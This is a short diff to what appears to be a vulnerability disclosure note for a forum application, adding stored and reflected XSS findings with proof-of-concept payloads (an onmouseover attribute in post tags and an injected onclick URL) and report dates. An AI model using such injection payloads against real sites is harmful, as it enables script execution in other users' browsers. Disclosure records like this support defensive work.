@@ -13,3 +13,17 @@
 # 02/13/2020: Discovered the vulnerability
 # 02/13/2020: Vendor confirmed
 # 02/17/2020: CVE-2020-9007
+
+## Stored XSS
+### Create a post with Tags : 1" onmouseover="alert(1)
+### XSS will be fired if you put your mouse on tags
+
+# REPORT TIMELINE
+# 02/24/2020: Discovered the vulnerability
+
+## Reflected XSS
+### Create a post with Tags : http://URL/codo/index.php?u=user/profile/11110%22%20accesskey=%22X%22%20onclick=%22alert(1)
+### Use Alt+Shift+X , XSS will be fired
+
+# REPORT TIMELINE
+# 02/24/2020: Discovered the vulnerability
